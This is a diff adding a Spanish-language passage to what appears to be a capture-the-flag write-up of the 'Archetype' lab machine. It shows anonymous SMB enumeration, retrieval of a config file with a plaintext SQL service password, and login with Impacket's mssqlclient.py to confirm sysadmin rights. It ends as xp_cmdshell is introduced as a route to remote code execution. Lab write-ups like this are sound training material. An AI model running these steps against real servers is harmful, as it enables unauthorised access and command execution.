@@ -126,3 +126,91 @@ Al saber que este puerto esta abierto podemos verificar si se ha permitido el ac
 	IPC$            IPC       Remote IPC
 SMB1 disabled -- no workgroup available
 ```
+
+En este punto podemos ver que tenemos una carpeta compartida llamada `backups`, podríamos ver adentro de ello para ver que encontramos y podemos ver que tenemos un archivo llamado `dtsConfig`, esto es una configuración usada con SSIS.
+
+```bash
+smbclient -N  \\\\10.10.10.27\\backups
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Jan 20 13:20:57 2020
+  ..                                  D        0  Mon Jan 20 13:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
+
+		10328063 blocks of size 4096. 8161394 blocks available
+smb: \> get prod.dtsConfig 
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3,1 KiloBytes/sec) (average 3,1 KiloBytes/sec)
+smb: \> exit
+```
+
+## ¿Qué es SSIS?
+
+Microsoft `SQL Server Integration Services (SSIS)` es una plataforma que permite generar soluciones de integración de datos de alto rendimiento, entre las que se incluyen `paquetes` de extracción, transformación y carga de datos (ETL) para el almacenamiento de datos.
+
+Los paquetes se guardan en la tabla `syssispackages`. Esta tabla incluye una columna de `ID` de carpeta que identifica la carpeta lógica a la que pertenece el `paquete`.
+
+
+### prod.dtsConfig
+
+```xml
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>
+```
+Podemos ver que en este archivo de configuración contiene una cadena de conexión `SQL` que son las credenciales de usuario local de Windows `ARCHETYPE\sql_svc`
+
+## Foothold
+
+Vamos a intentar conectar con el SQL Server usando un script en python de `Impacket` el cual es `mssqlclient.py`
+
+### ¿Qué es IMPACKET?
+
+Impacket es una colección de clases de Python para trabajar con protocolos de red. Impacket se centra en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implemetación del protocolo en sí. Los paquetes pueden construirse desde cero, así como analizarse a partir de datos sin procesar, y la API orientada a objetos facilita el trabajo con jerarquías profundas de protocolos.
+
+### mssqlclient.py
+
+Vamos a usar nuestro script en python para acceder a la base de datos la cual tenemos la contraseña que estaba en nuestro archivo de configuración `prod.dtsConfig`
+
+```python
+┌─[✗]─[rebcesp@parrot]─[~]
+└──╼ $python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
+              
+
+-----------   
+
+          1   
+
+SQL> 
+```
+*USE_SRVROLEMEMBER* Es la función que sirve para determinar si el usuario actual puede realizar una acción que necesite los permisos del rol del servidor.
+
+Si devuleve el valor `1` significa que LOGIN es miembro del grupo role, esto al tener éxito y de hecho, tenemos privilegios de administrador de sistemas.
+
+Esto nos permitirá habilitar `xp_cmdshell` y obtener `RCE` en el host. Intentemos esto, ingresando los siguientes comandos.
+
+### ¿Qué es xp_cmdshell?
+
+Es un procedimiento extendido muy potente que se lo utiliza para ejecutar la línea de comandos de Windows(cmd). Este comando es bastante útil para ejecutar tareas en el sistema operativo tales como copiar archivos, crear carpetas, compartir carpetas, etc. Mediante T-SQL. en pocas palabras podríamos intentar elevar privilegios.
+
+
+
+
+
+
